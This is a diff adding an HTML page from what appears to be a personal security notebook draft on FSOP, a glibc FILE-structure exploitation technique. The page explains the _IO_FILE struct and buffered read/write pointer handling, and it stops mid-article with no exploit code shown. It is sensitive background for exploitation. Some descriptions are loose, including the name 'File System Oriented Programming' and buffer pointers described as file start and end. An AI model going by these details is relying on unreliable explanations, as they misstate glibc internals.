@@ -1,0 +1,1284 @@
+
+
+
+
+
+
+
+<!doctype html>
+<html
+  lang="en"
+  dir="ltr"
+  class="scroll-smooth"
+  data-default-appearance="light"
+  data-auto-appearance="true"
+><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="theme-color" content="#FFFFFF" />
+  
+  <title>FSOP &middot; Griffin&#39;s notebook</title>
+    <meta name="title" content="FSOP &middot; Griffin&#39;s notebook" />
+  
+  
+  
+  
+  
+  <script
+    type="text/javascript"
+    src="//localhost:1313/js/appearance.min.8a082f81b27f3cb2ee528df0b0bdc39787034cf2cc34d4669fbc9977c929023c.js"
+    integrity="sha256-iggvgbJ/PLLuUo3wsL3Dl4cDTPLMNNRmn7yZd8kpAjw="
+  ></script>
+  
+  
+  
+  
+  
+  
+  
+  
+  <link
+    type="text/css"
+    rel="stylesheet"
+    href="//localhost:1313/css/main.bundle.min.a645f3fa02b2ca20e7ef61b236048d95cc9bc2e5b2faf1f0ac0aa85431187c1c.css"
+    integrity="sha256-pkXz&#43;gKyyiDn72GyNgSNlcybwuWy&#43;vHwrAqoVDEYfBw="
+  />
+  
+  
+  
+  
+  
+  
+  
+  <meta
+    name="description"
+    content="
+      
+        FILE and the underlying _IO_FILE struct #FSOP or File System Oriented Programming is a class of exploitation leveraging the FILE structure to gain arbitrary read/write or even remote code execution. In order to perform this set of exploitation class we have to understand what FILE structure is and how it operate on files.
+FILE or _IO_FILE (as defined in glibc source code) structure is a struct which handle a set of operations on a file. This structure is responsbile for handling required components in order to work with files in the operating system. Here&rsquo;s how the struct is defined in glibc source code:
+      
+    "
+  />
+  
+  
+  
+  
+    <link rel="canonical" href="//localhost:1313/notes/fsop/fsop/" />
+  
+  
+  
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png" />
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png" />
+    <link rel="manifest" href="/site.webmanifest" />
+  
+  
+  
+  
+  
+  
+  
+  
+  <meta property="og:url" content="//localhost:1313/notes/fsop/fsop/">
+  <meta property="og:site_name" content="Griffin&#39;s notebook">
+  <meta property="og:title" content="FSOP">
+  <meta property="og:description" content="FILE and the underlying _IO_FILE struct #FSOP or File System Oriented Programming is a class of exploitation leveraging the FILE structure to gain arbitrary read/write or even remote code execution. In order to perform this set of exploitation class we have to understand what FILE structure is and how it operate on files.
+FILE or _IO_FILE (as defined in glibc source code) structure is a struct which handle a set of operations on a file. This structure is responsbile for handling required components in order to work with files in the operating system. Here’s how the struct is defined in glibc source code:">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="notes">
+    <meta property="article:published_time" content="2026-02-10T01:01:22+07:00">
+    <meta property="article:modified_time" content="2026-02-10T01:01:22+07:00">
+
+  
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="FSOP">
+  <meta name="twitter:description" content="FILE and the underlying _IO_FILE struct #FSOP or File System Oriented Programming is a class of exploitation leveraging the FILE structure to gain arbitrary read/write or even remote code execution. In order to perform this set of exploitation class we have to understand what FILE structure is and how it operate on files.
+FILE or _IO_FILE (as defined in glibc source code) structure is a struct which handle a set of operations on a file. This structure is responsbile for handling required components in order to work with files in the operating system. Here’s how the struct is defined in glibc source code:">
+
+  
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "articleSection": "Notes",
+    "name": "FSOP",
+    "headline": "FSOP",
+    
+    "abstract": "\u003ch2 id=\u0022file-and-the-underlying-_io_file-struct\u0022 class=\u0022relative group\u0022\u003eFILE and the underlying _IO_FILE struct \u003cspan class=\u0022absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100\u0022\u003e\u003ca class=\u0022group-hover:text-primary-300 dark:group-hover:text-neutral-700\u0022 style=\u0022text-decoration-line: none !important;\u0022 href=\u0022#file-and-the-underlying-_io_file-struct\u0022 aria-label=\u0022Anchor\u0022\u003e#\u003c\/a\u003e\u003c\/span\u003e\u003c\/h2\u003e\u003cp\u003eFSOP or File System Oriented Programming is a class of exploitation leveraging the FILE structure to gain arbitrary read\/write or even remote code execution. In order to perform this set of exploitation class we have to understand what FILE structure is and how it operate on files.\u003c\/p\u003e\n\u003cp\u003eFILE or _IO_FILE (as defined in glibc source code) structure is a struct which handle a set of operations on a file. This structure is responsbile for handling required components in order to work with files in the operating system. Here\u0026rsquo;s how the struct is defined in glibc source code:\u003c\/p\u003e",
+    "inLanguage": "en",
+    "url" : "\/\/localhost:1313\/notes\/fsop\/fsop\/",
+    "author" : {
+      "@type": "Person",
+      "name": "Griffin Sectio"
+    },
+    "copyrightYear": "2026",
+    "dateCreated": "2026-02-10T01:01:22\u002b07:00",
+    "datePublished": "2026-02-10T01:01:22\u002b07:00",
+    
+    "dateModified": "2026-02-10T01:01:22\u002b07:00",
+    
+    
+    
+    "mainEntityOfPage": "true",
+    "wordCount": "1856"
+  }
+  </script>
+    
+    <script type="application/ld+json">
+    {
+   "@context": "https://schema.org",
+   "@type": "BreadcrumbList",
+   "itemListElement": [
+     {
+       "@type": "ListItem",
+       "item": "//localhost:1313/",
+       "name": "",
+       "position": 1
+     },
+     {
+       "@type": "ListItem",
+       "item": "//localhost:1313/notes/",
+       "name": "Notes",
+       "position": 2
+     },
+     {
+       "@type": "ListItem",
+       "name": "Fsop",
+       "position": 3
+     }
+   ]
+ }
+  </script>
+
+  
+  
+    <meta name="author" content="Griffin Sectio" />
+  
+  
+  
+  
+
+
+
+
+
+
+
+  
+  
+
+  
+  
+</head>
+<body
+    class="m-auto flex h-screen max-w-7xl flex-col bg-neutral px-6 text-lg leading-7 text-neutral-900 dark:bg-neutral-800 dark:text-neutral sm:px-14 md:px-24 lg:px-32"
+  >
+    <div id="the-top" class="absolute flex self-center">
+      <a
+        class="-translate-y-8 rounded-b-lg bg-primary-200 px-3 py-1 text-sm focus:translate-y-0 dark:bg-neutral-600"
+        href="#main-content"
+        ><span class="pe-2 font-bold text-primary-600 dark:text-primary-400">&darr;</span
+        >Skip to main content</a
+      >
+    </div>
+    
+    
+      <header class="py-6 font-semibold text-neutral-900 dark:text-neutral sm:py-10 print:hidden">
+  <nav class="flex items-start justify-between sm:items-center">
+    
+    <div class="flex flex-row items-center">
+      
+  <a
+    class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2"
+    rel="me"
+    href="/"
+    >Griffin&rsquo;s notebook</a
+  >
+
+    </div>
+    
+    
+      <ul class="flex list-none flex-col text-end sm:flex-row">
+        
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0.5">
+              
+                <a
+                  href="/notes/"
+                  title="Notes"
+                  
+                  ><span
+                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                      >Notes</span
+                    >
+                  </a
+                >
+              
+            </li>
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0.5">
+              
+                <a
+                  href="/writeups/"
+                  title="Writeups"
+                  
+                  ><span
+                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                      >Writeups</span
+                    >
+                  </a
+                >
+              
+            </li>
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0.5">
+              
+                <a
+                  href="https://github.com/jpanther/congo"
+                  title=""
+                  target="_blank"
+                  >
+                    <span
+                      class="group-dark:hover:text-primary-400 transition-colors group-hover:text-primary-600"
+                    ><span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
+</span></span></a
+                >
+              
+            </li>
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0.5">
+              
+                
+                
+              
+            </li>
+          
+          
+        
+      </ul>
+    
+  </nav>
+</header>
+
+    
+    <div class="relative flex grow flex-col">
+      <main id="main-content" class="grow">
+        
+  <article>
+    <header class="max-w-prose">
+      
+      <h1 class="mb-8 mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
+        FSOP
+      </h1>
+      
+        <div class="mb-10 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
+          
+
+
+
+
+
+  
+  
+
+
+
+  
+
+  
+  
+    
+  
+
+  
+
+  
+
+  
+    
+  
+
+  
+
+
+  <div class="flex flex-row flex-wrap items-center">
+    
+    
+      <time datetime="2026-02-10 01:01:22 &#43;0700 &#43;07">10 February 2026</time><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">9 mins</span>
+    
+
+    
+    
+      <span class="ps-2"><span class="flex">
+  <span
+    class="ms-1 rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400"
+  >
+    Draft
+  </span>
+</span>
+</span>
+    
+  </div>
+
+  
+  
+
+
+        </div>
+      
+      
+    </header>
+    <section class="prose mt-0 flex max-w-full flex-col dark:prose-invert lg:flex-row">
+      
+      <div class="min-h-0 min-w-0 max-w-prose grow">
+        <h2 id="file-and-the-underlying-_io_file-struct" class="relative group">FILE and the underlying _IO_FILE struct <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#file-and-the-underlying-_io_file-struct" aria-label="Anchor">#</a></span></h2><p>FSOP or File System Oriented Programming is a class of exploitation leveraging the FILE structure to gain arbitrary read/write or even remote code execution. In order to perform this set of exploitation class we have to understand what FILE structure is and how it operate on files.</p>
+<p>FILE or _IO_FILE (as defined in glibc source code) structure is a struct which handle a set of operations on a file. This structure is responsbile for handling required components in order to work with files in the operating system. Here&rsquo;s how the struct is defined in glibc source code:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> _IO_FILE
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> _flags;		<span style="color:#75715e">/* High-order word is _IO_MAGIC; rest is flags. */</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">/* The following pointers correspond to the C++ streambuf protocol. */</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>_IO_read_ptr;	<span style="color:#75715e">/* Current read pointer */</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>_IO_read_end;	<span style="color:#75715e">/* End of get area. */</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>_IO_read_base;	<span style="color:#75715e">/* Start of putback+get area. */</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>_IO_write_base;	<span style="color:#75715e">/* Start of put area. */</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>_IO_write_ptr;	<span style="color:#75715e">/* Current put pointer. */</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>_IO_write_end;	<span style="color:#75715e">/* End of put area. */</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>_IO_buf_base;	<span style="color:#75715e">/* Start of reserve area. */</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>_IO_buf_end;	<span style="color:#75715e">/* End of reserve area. */</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">/* The following fields are used to support backing up and undo. */</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>_IO_save_base; <span style="color:#75715e">/* Pointer to start of non-current get area. */</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>_IO_backup_base;  <span style="color:#75715e">/* Pointer to first valid character of backup area */</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>_IO_save_end; <span style="color:#75715e">/* Pointer to end of non-current get area. */</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">struct</span> _IO_marker <span style="color:#f92672">*</span>_markers;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">struct</span> _IO_FILE <span style="color:#f92672">*</span>_chain;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> _fileno;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> _flags2:<span style="color:#ae81ff">24</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">/* Fallback buffer to use when malloc fails to allocate one.  */</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> _short_backupbuf[<span style="color:#ae81ff">1</span>];
+</span></span><span style="display:flex;"><span>  __off_t _old_offset; <span style="color:#75715e">/* This used to be _offset but it&#39;s too small.  */</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">/* 1+column number of pbase(); 0 is unknown. */</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">short</span> _cur_column;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">signed</span> <span style="color:#66d9ef">char</span> _vtable_offset;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> _shortbuf[<span style="color:#ae81ff">1</span>];
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  _IO_lock_t <span style="color:#f92672">*</span>_lock;
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#ifdef _IO_USE_OLD_IO_FILE
+</span></span></span><span style="display:flex;"><span>};
+</span></span></code></pre></div><p>We can group the members of the struct into the following categories:</p>
+<ul>
+<li>Pointers for reading from file
+<ul>
+<li><code>char *_IO_read_ptr</code> is a pointer to keep track of our position in the file</li>
+<li><code>char *_IO_read_end</code> is a pointer to the end of the file</li>
+<li><code>char *_IO_read_base</code> is a pointer to the stard of the file</li>
+</ul>
+</li>
+<li>Pointers for writing to file
+<ul>
+<li><code>char *_IO_write_base</code> is a pointer to start of the file</li>
+<li><code>char *_IO_write_ptr</code> is a pointer to keep track of our position in the file</li>
+<li><code>char *_IO_write_end</code> is a pointer to the end of the file</li>
+</ul>
+</li>
+<li>Internal buffer handling
+<ul>
+<li><code>char *_IO_buf_base</code> is a pointer to the start of internal buffer</li>
+<li><code>char *_IO_buf_end</code> is a pointer to the end of internal buffer</li>
+</ul>
+</li>
+</ul>
+<h2 id="how-reading-from-file-happens" class="relative group">How reading from file happens <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#how-reading-from-file-happens" aria-label="Anchor">#</a></span></h2><p>If we&rsquo;re using <code>open</code> on a file, it will return a file descriptor pointing to the file. Internally the file descriptor that we got is not the actual file descriptor for the file in the filesystem and whenever we want to operate on the file it has to be translated first. The following picture describe this process
+
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="//localhost:1313/notes/fsop/fsop/fd_translation_hu_3a8951d081a1de93.webp 330w,//localhost:1313/notes/fsop/fsop/fd_translation_hu_e3f16c882c0a59d6.webp 660w
+            
+              ,//localhost:1313/notes/fsop/fsop/fd_translation_hu_fa9c2fa9de9a7b3.webp 1024w
+            
+            
+              ,//localhost:1313/notes/fsop/fsop/fd_translation_hu_4faeabc1f0e1f96f.webp 1320w
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="2030"
+        height="686"
+        class="mx-auto my-0 rounded-md"
+        alt="alt"
+        loading="lazy" decoding="async"
+        
+          src="//localhost:1313/notes/fsop/fsop/fd_translation_hu_fc7169390ff03b82.png" srcset="//localhost:1313/notes/fsop/fsop/fd_translation_hu_b741ea9dc4b49866.png 330w,//localhost:1313/notes/fsop/fsop/fd_translation_hu_fc7169390ff03b82.png 660w
+          
+            ,//localhost:1313/notes/fsop/fsop/fd_translation_hu_f3d317d60ef368ff.png 1024w
+          
+          
+            ,//localhost:1313/notes/fsop/fsop/fd_translation_hu_7997e77246a656c9.png 1320w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+
+Whenever we&rsquo;re trying to carry out operation, internally the fd that we got earlier from <code>open</code> would need to be translated. First it will try to find the corresponding file descriptor object in process file table. Then, the entry in process file table will have a pointer to an entry in global file table. Finally to actually perform the operation there will be a pointer to inode which hold the actual file in the filesystem. After performing the operation we will do context switch back to userland.
+For each operation we will have to do fd translation, hunting down the inode, performing the operation loop. This would be fine for infrequent file access but if we have to do numerous amount of operations this approach would hurt the performance. To fix this problem, instead of using <code>open</code> and <code>read</code> we use <code>fopen</code> and <code>fread</code>. The difference with traditional <code>open</code> and <code>read</code> is that <code>fopen</code> and <code>fread</code> operate on a FILE object.</p>
+<p>When we want to read from a file, in internally glibc would use a buffer. This internal buffer have the size of a page or 0x1000 bytes. Whenever we try to read from a file this internal buffer will be initiated and will be filled with the bytes from the file. The <code>_IO_read_ptr</code> is pointing to the bytes that we are about to read, <code>_IO_read_base</code> points to the start of the file, <code>_IO_buf_base</code> points to the start of the internal buffer. At the other end there will be 2 pointers, <code>_IO_read_end</code> which points to the end of the file and <code>_IO_buf_end</code> which points to the end of the internal buffer.
+
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="//localhost:1313/notes/fsop/fsop/file_read_1_hu_14753372863bc12.webp 330w,//localhost:1313/notes/fsop/fsop/file_read_1_hu_183513c52b4b6066.webp 660w
+            
+              ,//localhost:1313/notes/fsop/fsop/file_read_1_hu_8ef26a7175137dc2.webp 1024w
+            
+            
+              
+                ,//localhost:1313/notes/fsop/fsop/file_read_1_hu_7e916f66951a79be.webp 1315w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="1315"
+        height="698"
+        class="mx-auto my-0 rounded-md"
+        alt="alt"
+        loading="lazy" decoding="async"
+        
+          src="//localhost:1313/notes/fsop/fsop/file_read_1_hu_a02e0bb3856680.png" srcset="//localhost:1313/notes/fsop/fsop/file_read_1_hu_507d42f6b78065a5.png 330w,//localhost:1313/notes/fsop/fsop/file_read_1_hu_a02e0bb3856680.png 660w
+          
+            ,//localhost:1313/notes/fsop/fsop/file_read_1_hu_bb5d9f0b4a9df38d.png 1024w
+          
+          
+            ,//localhost:1313/notes/fsop/fsop/file_read_1.png 1315w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+
+Everytime we want to read from the file, we actually read from the internal buffer which holds the bytes from the file. The <code>_IO_read_ptr</code> got advances by the amount of bytes we want to read.
+
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="//localhost:1313/notes/fsop/fsop/file_read_2_hu_4e782b027d0e9a1d.webp 330w,//localhost:1313/notes/fsop/fsop/file_read_2_hu_2a6488cf0b72dbd3.webp 660w
+            
+              ,//localhost:1313/notes/fsop/fsop/file_read_2_hu_b6a98eb2928386d1.webp 1024w
+            
+            
+              ,//localhost:1313/notes/fsop/fsop/file_read_2_hu_c72d59d6a9845cb5.webp 1320w
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="1339"
+        height="626"
+        class="mx-auto my-0 rounded-md"
+        alt="alt"
+        loading="lazy" decoding="async"
+        
+          src="//localhost:1313/notes/fsop/fsop/file_read_2_hu_76c54bc028dba9c7.png" srcset="//localhost:1313/notes/fsop/fsop/file_read_2_hu_c04c32dcde359c4.png 330w,//localhost:1313/notes/fsop/fsop/file_read_2_hu_76c54bc028dba9c7.png 660w
+          
+            ,//localhost:1313/notes/fsop/fsop/file_read_2_hu_981bd69781495409.png 1024w
+          
+          
+            ,//localhost:1313/notes/fsop/fsop/file_read_2_hu_7bf0728442dd3259.png 1320w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+
+When we finally read all the bytes from the buffer but it&rsquo;s not the <em>end of the file</em> yet, the internal buffer will be replaced with another one of the same size which hold the remaining content of the file.
+
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="//localhost:1313/notes/fsop/fsop/file_read_3_hu_fff0840d530fbf5e.webp 330w,//localhost:1313/notes/fsop/fsop/file_read_3_hu_35af4c4e89ef6c83.webp 660w
+            
+              ,//localhost:1313/notes/fsop/fsop/file_read_3_hu_1eb96db72db95957.webp 1024w
+            
+            
+              ,//localhost:1313/notes/fsop/fsop/file_read_3_hu_741cd1f25d2e8a0b.webp 1320w
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="1339"
+        height="682"
+        class="mx-auto my-0 rounded-md"
+        alt="alt"
+        loading="lazy" decoding="async"
+        
+          src="//localhost:1313/notes/fsop/fsop/file_read_3_hu_bc0d87aba0cbdc94.png" srcset="//localhost:1313/notes/fsop/fsop/file_read_3_hu_40665a375b3850d1.png 330w,//localhost:1313/notes/fsop/fsop/file_read_3_hu_bc0d87aba0cbdc94.png 660w
+          
+            ,//localhost:1313/notes/fsop/fsop/file_read_3_hu_1c76f1cf4718a05c.png 1024w
+          
+          
+            ,//localhost:1313/notes/fsop/fsop/file_read_3_hu_17629f873f5dcc42.png 1320w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+
+If <code>_IO_read_ptr</code> is equal to <code>_IO_read_end</code> that means we&rsquo;ve reached the <em>end of the file</em> and there&rsquo;ll be nothing left to read.
+
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="//localhost:1313/notes/fsop/fsop/file_read_4_hu_669cac16f11b6b7d.webp 330w,//localhost:1313/notes/fsop/fsop/file_read_4_hu_7f9d8e84731387da.webp 660w
+            
+              ,//localhost:1313/notes/fsop/fsop/file_read_4_hu_f830d0df14527dd6.webp 1024w
+            
+            
+              ,//localhost:1313/notes/fsop/fsop/file_read_4_hu_d841a63d6a88154e.webp 1320w
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="1339"
+        height="674"
+        class="mx-auto my-0 rounded-md"
+        alt="alt"
+        loading="lazy" decoding="async"
+        
+          src="//localhost:1313/notes/fsop/fsop/file_read_4_hu_30dd68f765e8cd82.png" srcset="//localhost:1313/notes/fsop/fsop/file_read_4_hu_a7f36972326f5870.png 330w,//localhost:1313/notes/fsop/fsop/file_read_4_hu_30dd68f765e8cd82.png 660w
+          
+            ,//localhost:1313/notes/fsop/fsop/file_read_4_hu_ab47f8c68444233e.png 1024w
+          
+          
+            ,//localhost:1313/notes/fsop/fsop/file_read_4_hu_8c8d040baff61028.png 1320w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<h2 id="how-writing-to-file-happens" class="relative group">How writing to file happens <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#how-writing-to-file-happens" aria-label="Anchor">#</a></span></h2><p>Unsurprisingly, the write operation to file doesn&rsquo;t stray so far from reading from file. We still use the internal buffer where we use it like a draft where our write reside before comitted to the file.
+
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="//localhost:1313/notes/fsop/fsop/file_write_1_hu_6ad6a8385b844de1.webp 330w,//localhost:1313/notes/fsop/fsop/file_write_1_hu_ff7709abfb4f7881.webp 660w
+            
+              ,//localhost:1313/notes/fsop/fsop/file_write_1_hu_9370b9e6080caf05.webp 1024w
+            
+            
+              ,//localhost:1313/notes/fsop/fsop/file_write_1_hu_d9e56c6ba949be52.webp 1320w
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="1322"
+        height="690"
+        class="mx-auto my-0 rounded-md"
+        alt="alt"
+        loading="lazy" decoding="async"
+        
+          src="//localhost:1313/notes/fsop/fsop/file_write_1_hu_3b8f66a5825b0116.png" srcset="//localhost:1313/notes/fsop/fsop/file_write_1_hu_44607118991bf731.png 330w,//localhost:1313/notes/fsop/fsop/file_write_1_hu_3b8f66a5825b0116.png 660w
+          
+            ,//localhost:1313/notes/fsop/fsop/file_write_1_hu_bc8db501a4502484.png 1024w
+          
+          
+            ,//localhost:1313/notes/fsop/fsop/file_write_1_hu_6245b2619d190d7b.png 1320w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+
+When we write to a file, we aren&rsquo;t actually directly writing to it. Internally we write to the internal buffer and eventually it will commit the write to the file.
+
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="//localhost:1313/notes/fsop/fsop/file_write_2_hu_fdf24a3763ff7813.webp 330w,//localhost:1313/notes/fsop/fsop/file_write_2_hu_9075cf94e22ec683.webp 660w
+            
+              ,//localhost:1313/notes/fsop/fsop/file_write_2_hu_986c1290eeddddb8.webp 1024w
+            
+            
+              ,//localhost:1313/notes/fsop/fsop/file_write_2_hu_875583731a5606d4.webp 1320w
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="1322"
+        height="634"
+        class="mx-auto my-0 rounded-md"
+        alt="alt"
+        loading="lazy" decoding="async"
+        
+          src="//localhost:1313/notes/fsop/fsop/file_write_2_hu_8f8a065e2a00ad4.png" srcset="//localhost:1313/notes/fsop/fsop/file_write_2_hu_cd4035ecfa8a31f3.png 330w,//localhost:1313/notes/fsop/fsop/file_write_2_hu_8f8a065e2a00ad4.png 660w
+          
+            ,//localhost:1313/notes/fsop/fsop/file_write_2_hu_615006c792c1f934.png 1024w
+          
+          
+            ,//localhost:1313/notes/fsop/fsop/file_write_2_hu_c34ea8cb38512893.png 1320w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+
